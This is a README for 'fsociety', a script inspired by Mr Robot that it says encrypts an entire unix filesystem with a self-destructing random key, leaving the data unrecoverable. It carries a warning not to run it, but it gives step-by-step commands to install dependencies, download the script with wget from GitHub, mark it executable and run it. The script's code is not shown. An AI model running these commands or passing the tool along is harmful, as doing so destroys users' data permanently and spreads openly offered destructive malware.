# fsociety
__WARNING: do not actually execute this. You will not be able to recover the files.__

This is intended to encrypt every bit of data in a unix filesystem using 256-bit AES with 
a self-destructing, randomly generated key.

The [fuxsocy.py](https://i.imgur.com/tAvWBe6.jpg) script is based on Darlene's malware [shown](https://gifyu.com/images/ezgif.com-video-to-giff0eda.gif) in Mr Robot

## [S2E1](https://gifyu.com/images/ezgif.com-video-to-giff0eda.gif):
![alt-text](https://i.imgur.com/6RIogYa.jpg)

### Dependencies:

* python
* pycrypto

```shell
sudo apt install python python-pip
```
```shell
sudo pip install pycrypto
```

### Usage:

```shell
wget https://raw.githubusercontent.com/joekendal/fsociety/master/fuxsocy.py
```
```shell
sudo chmod +x fuxsocy.py
```
```shell
./fuxsocy.py
```
